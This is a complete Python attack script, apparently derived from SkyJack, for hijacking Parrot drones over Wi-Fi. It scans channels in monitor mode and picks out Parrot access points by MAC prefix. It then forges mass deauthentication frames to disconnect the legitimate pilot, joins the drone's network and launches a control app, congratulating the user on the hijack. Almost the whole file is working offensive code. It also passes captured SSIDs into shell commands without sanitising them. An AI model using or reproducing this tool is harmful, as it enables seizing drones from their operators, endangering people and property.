#! /usr/bin/env python3
#
# Drone hacker tool
# Inspired from https://github.com/samyk/skyjack/
#

from scapy.all import *
import subprocess as sbp
import sys
import re


# ===============
#    Variables
# ===============

debug_enabled = True
monitor_with_airmon = False
deauth_with_aireplay = False

interface = "wlp0s20f0u2"
phy_iface = "phy1"

# Parrot owns the 90:03:B7 block of MACs and a few others
# see here: http://standards.ieee.org/develop/regauth/oui/oui.txt
parrot_macs = ("90:03:B7", "00:12:1C", "90:3A:E6", "A0:14:3D", "00:12:1C", "00:26:7E")
PARROT_IP   = "192.168.1.1"

WIFI_CHAN_MIN = 1
WIFI_CHAN_MAX = 13

ip_prog   = "ip"
iw_prog   = "iw"
ifconfig  = "ifconfig"
iwconfig  = "iwconfig"
airmon    = "airmon-ng"
aireplay  = "aireplay-ng"
dhclient  = "dhclient"
nodejs    = "node"
controljs = "app.js"


detected_aps   = []
parrot_aps     = []
parrot_clients = []



# =============
#    Classes
# =============

class term:
    BLUE      = '\033[94m'
    GREEN     = '\033[92m'
    ORANGE    = '\033[93m'
    RED       = '\033[91m'
    PURPLE    = '\033[95m'
    ENDC      = '\033[0m'
    BOLD      = '\033[1m'
    UNDERLINE = '\033[4m'
    CLEAR     = '\033c'

class symbols:
    INFO  = term.GREEN + term.BOLD + "==>"   + term.ENDC
    DBG   = term.BLUE  + term.BOLD + "-->"   + term.ENDC
    LIST0 = term.GREEN + term.BOLD + " -"    + term.ENDC
    LIST1 = term.GREEN + term.BOLD + "    -" + term.ENDC

class AccessPoint:
    def __init__(self, ssid, bssid, channel, crypto):
        self.ssid   = ssid
        self.bssid  = bssid
        self.chan   = channel
        self.crypto = crypto

    def __str__(self):
        return "AP " + self.bssid \
            + " with SSID " + self.ssid \
            + " on channel " + str(self.chan) \
            + " (" + ' / '.join(self.crypto) + ")"

    def short_str(self):
        return self.ssid + " (" + self.bssid + ")"

    def __eq__(self, other):
        return isinstance(other, self.__class__) and self.__dict__ == other.__dict__

class Client:
    def __init__(self, mac, ip):
        self.mac = mac
        self.ip  = ip

    def __str__(self):
        return self.ip + " with MAC " + self.mac

    def __eq__(self, other):
        return isinstance(other, self.__class__) and self.__dict__ == other.__dict__



# ===============
#    Functions
# ===============

""" Define a sudo exec function. """
def sudo(*args):
    command  = ' '.join(args)
    command += ("" if debug_enabled else " >>/dev/null")
    try:
        if debug_enabled:
            print(symbols.DBG, "Running '" + command + "'")

        retcode = sbp.call(command, shell=True)

        if debug_enabled:
            print(symbols.DBG, "Command returned", retcode)

    except OSError as e:
        print("Execution failed:", e)



""" Put device into managed mode. """
def switch2managed():
    global interface

    if debug_enabled:
        print(symbols.DBG, "Switching adapter to managed mode")

    if monitor_with_airmon:
        sudo(airmon, "stop", interface)
        interface = interface.replace("mon", "")
    else:
        sudo(ip_prog, "link set", interface, "down")
        sudo(iw_prog, interface, "del")

        interface = interface.replace("mon", "")
        sudo(iw_prog, phy_iface, "interface add", interface, "type managed")
        sudo(ip_prog, "link set", interface, "up")


""" Put device into monitor mode. """
def switch2monitor():
    global interface

    if debug_enabled:
        print(symbols.DBG, "Switching adapter to monitor mode")

    if monitor_with_airmon:
        sudo(ifconfig, interface, "down")
        sudo(iwconfig, interface, "mode", "managed")
        sudo(ifconfig, interface, "up")

        sudo(airmon, "check kill")
        sudo(airmon, "start", interface)
        interface = interface + "mon"
    else:
        sudo(ip_prog, "link set", interface, "down")
        sudo(iw_prog, interface, "del")

        interface = interface + "mon"
        sudo(iw_prog, phy_iface, "interface add", interface, "type monitor")
        sudo(ip_prog, "link set", interface, "up")


""" Filter wifi beacon and probe response packets. """
def filter_probe_requests(p):
    return p.haslayer(Dot11Elt) and ( p.haslayer(Dot11Beacon) or p.haslayer(Dot11ProbeResp) )


""" Register an access point. """
def register_ap(p):
    # Get AP details
    ssid         = p.info.decode("utf-8")
    bssid        = p.addr3
    channel      = int( ord(p[Dot11Elt:3].info))
    capabilities = p.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}\
            {Dot11ProbeResp:%Dot11ProbeResp.cap%}")

    # Extract crypto informations
    crypto = set()
    while isinstance(p, Dot11Elt):
        if p.ID == 0:
            ssid = p.info
        elif p.ID == 3:
            channel = ord(p.info)
        elif p.ID == 48:
            crypto.add("WPA2")
        elif p.ID == 221 and p.info.startswith('\x00P\xf2\x01\x01\x00'):
            crypto.add("WPA")
        p = p.payload

    if not crypto:
        if "privacy" in capabilities:
            crypto.add("WEP")
        else:
            crypto.add("OPEN")

    # Build AccessPoint object
    ap = AccessPoint(ssid, bssid, channel, crypto)

    # Save discovered AP
    if ap not in detected_aps:
        detected_aps.append(ap)
        print(symbols.LIST1, ap)


""" Refresh Parrot AP list. """
def refresh_ap_list():
    print()

    # Show APs
    switch2monitor()
    print(symbols.INFO, "Searching for new running APs")
    for chan in range(WIFI_CHAN_MIN, WIFI_CHAN_MAX + 1):
        sudo("iw dev", interface, "set channel", str(chan))
        sniff(iface=interface, lfilter=filter_probe_requests, prn=register_ap, timeout=0.1)
    switch2managed()

    # Filter Parrot's MAC addresses
    print(symbols.INFO, "Filtering Parrot's APs")
    found_parrot = False
    for ap in detected_aps:
        # Eventually register AP only if not registered
        if ap not in parrot_aps:
            # Check all Parrot MACs
            for mac in parrot_macs:
                if re.match(mac, ap.bssid, re.IGNORECASE):
                    parrot_aps.append(ap)
                    print(symbols.LIST1, "New Parrot drone found with MAC", ap.bssid)
                    found_parrot = True


""" Show detected access points. """
def show_aps():
    print()

    # Show APs
    print("Found APs:")
    if len(detected_aps) == 0:
        print(symbols.LIST0, term.RED + "No AP found!" + term.ENDC)
    else:
        for ap in detected_aps: print(symbols.LIST0, ap)

    # Show Parrot APs
    print("Found APs with Parrot MAC address:")
    if len(parrot_aps) == 0:
        print(symbols.LIST0, term.RED + "No Parrot AP found!" + term.ENDC)
    else:
        for ap in parrot_aps:
            print(symbols.LIST0, ap)


""" Prints an option. """
def print_menu_opt(option, *explanation):
    print("  [" + term.ORANGE + term.BOLD + option + term.ENDC + "]", *explanation)


""" Prints a menu title. """
def print_menu(*title):
    print('\n\n' + term.PURPLE
            + "================================================================================"
            + term.ENDC + '\n' + term.BOLD)
    print(*title, term.ENDC)

""" Prints an error message. """
def print_err(*msg):
    print(term.RED + term.BOLD, end="")
    print(*msg, term.ENDC)


""" Filter wifi clients of a specific BSSID. """
def filter_bssid_clients(bssid, p):
    return ( ( p.haslayer(Dot11) or p.haslayer(Dot11FCS) )
            and p.addr3 == bssid and p.haslayer(IP) )


""" Register client of a specific BSSID. """
def register_bssid_client(p):
    # Extract informations
    mac_dst = p.addr1
    mac_src = p.addr2
    bssid   = p.addr3

    ip_dst = p[IP].dst
    ip_src = p[IP].src

    mac = mac_src   if mac_src != bssid         else mac_dst
    ip  = ip_src    if ip_src  != PARROT_IP     else ip_dst

    # Register client
    client = Client(mac, ip)
    if client not in parrot_clients:
        parrot_clients.append(client)
        print(symbols.LIST1, "Found client on", client)


""" Checks for connected clients. """
def check_for_clients(ap):
    print()
    print(symbols.INFO, "Searching for connected clients to Parrot AP", ap.ssid)
    switch2monitor()
    sudo("iw dev", interface, "set channel", str(ap.chan))
    sniff(iface=interface,
            lfilter=lambda x: filter_bssid_clients(ap.bssid, x),
            prn=register_bssid_client,
            timeout=1)
    switch2managed()


""" Deauthenticate a client. """
def deauth_client(client, ap):
    print()

    if deauth_with_aireplay:
        print(symbols.INFO, "Disconnecting client", client, "with aireplay")
        switch2monitor()
        sudo("iw dev", interface, "set channel", str(ap.chan))
        sudo(aireplay, "-0 3 -a", ap.bssid, "-c", client.mac, interface)
        switch2managed()

    else:
        print(symbols.INFO, "Disconnecting client", client)

        # Build packets: addr1=dst, addr2=src, addr3=bssid
        deauth_pkt = RadioTap() \
                / Dot11(addr1=ap.bssid, addr2=client.mac, addr3=ap.bssid) \
                / Dot11Deauth(reason=7)

        # Send packet
        switch2monitor()
        sudo("iw dev", interface, "set channel", str(ap.chan))
        sendp(deauth_pkt, iface=interface, count=500, verbose=debug_enabled)
        switch2managed()


""" Take control of a parrot drone. """
def parrot_control(ap):
    print()

    # Connect to drone ESSID
    print(symbols.INFO, "Connecting to drone", ap.short_str())
    sudo(iw_prog, "dev", interface, "connect", ap.ssid)
    sudo("while [ \"$(", iw_prog, interface, "link)\" = \"Not connected.\" ]; do", iw_prog, interface, "connect", ap.ssid, "; sleep 0.1; done")

    # Acquire IP
    print(symbols.INFO, "Acquiring IP from drone")
    sudo(dhclient, "-r")
    sudo(dhclient, "-v", interface)

    # Take control
    print(symbols.INFO, "Taking drone control")
    sudo("cd ardrone-webflight ;", nodejs, controljs)

    # Congrats user
    print(symbols.INFO, "Well done! You've hijacked the Parrot drone! :)")


""" Hacks a Parrot AP. """
def hack_parrot(ap):
    global parrot_clients
    end_hack       = False
    parrot_clients = []

    # Initially check for connected clients
    check_for_clients(ap)

    # Choose action
    while not end_hack:
        try:
            parrot_clients_count = len(parrot_clients)

            # Show menu
            print_menu("Hacking menu for", ap.short_str())

            if (parrot_clients_count == 0):
                print_menu_opt(' ', "No client detected. Try to search for new connected clients!")
            else:
                for i in range(0, parrot_clients_count):
                    print_menu_opt(str(i+1),
                            "Disconnect client", parrot_clients[i].ip, "then take control")

            print_menu_opt('C', "Search for new connected clients")
            print_menu_opt('T', "Take control (no connected clients)")
            print_menu_opt('Q', "Go back to main menu (exit hacking menu)")

            user_input = input("\nYour choice: ").lower()


            # Exec user action
            if user_input == 'q':
                end_hack = True

            elif user_input == 'c':
                check_for_clients(ap)

            elif user_input == 't':
                parrot_control(ap)

            else:
                try:
                    idx = int(user_input) - 1

                    if idx < 0 or parrot_clients_count < idx:
                        raise IndexError
                    else:
                        deauth_client(parrot_clients[idx], ap)
                        parrot_control(ap)

                except ValueError:
                    print_err("Please make a valid choice!")
                except IndexError:
                    if parrot_clients_count > 0:
                        print_err("Available client: 1 ->", parrot_clients_count)
                    else:
                        print_err("No available Parrot AP!")

        except KeyboardInterrupt:
            end_hack = True



# ===============
#    Main code
# ===============

exit = False
if __name__ == "__main__":
    print(term.CLEAR + '\n' + term.BLUE +
          "      ____                                               __      __            ")
    print("     / __ \_________  ____  ___     ____  ________  ____/ /___ _/ /_____  _____")
    print("    / / / / ___/ __ \/ __ \/ _ \   / __ \/ ___/ _ \/ __  / __ `/ __/ __ \/ ___/")
    print("   / /_/ / /  / /_/ / / / /  __/  / /_/ / /  /  __/ /_/ / /_/ / /_/ /_/ / /    ")
    print("  /_____/_/   \____/_/ /_/\___/  / .___/_/   \___/\__,_/\__,_/\__/\____/_/     ")
    print("                                /_/                                            "
            + term.ENDC)

    while not exit:
        try:
            parrot_count = len(parrot_aps)

            # Show menu
            print_menu("Main menu:")

            if (parrot_count == 0):
                print_menu_opt(' ', "No Parrot AP detected. Try to refresh!")
            else:
                for i in range(0, parrot_count):
                    ap = parrot_aps[i]
                    print_menu_opt(str(i+1), "Hack Parrot", ap.ssid, '(' + ap.bssid + ')')

            print_menu_opt('R', "Refresh running APs and Parrot APs")
            print_menu_opt('S', "Show found APs")
            print_menu_opt('Q', "Exit program")

            user_input = input("\nYour choice: ").lower()


            # Exec user action
            if user_input == 'q':
                exit = True

            elif user_input == 'r':
                refresh_ap_list()

            elif user_input == 's':
                show_aps()

            else:
                try:
                    idx = int(user_input) - 1

                    if idx < 0 or parrot_count < idx:
                        raise IndexError
                    else:
                        hack_parrot(parrot_aps[idx])

                except ValueError:
                    print_err("Please make a valid choice!")
                except IndexError:
                    if parrot_count > 0:
                        print_err("Available APs: 1 ->", parrot_count)
                    else:
                        print_err("No available Parrot AP!")

        except KeyboardInterrupt:
            exit = True

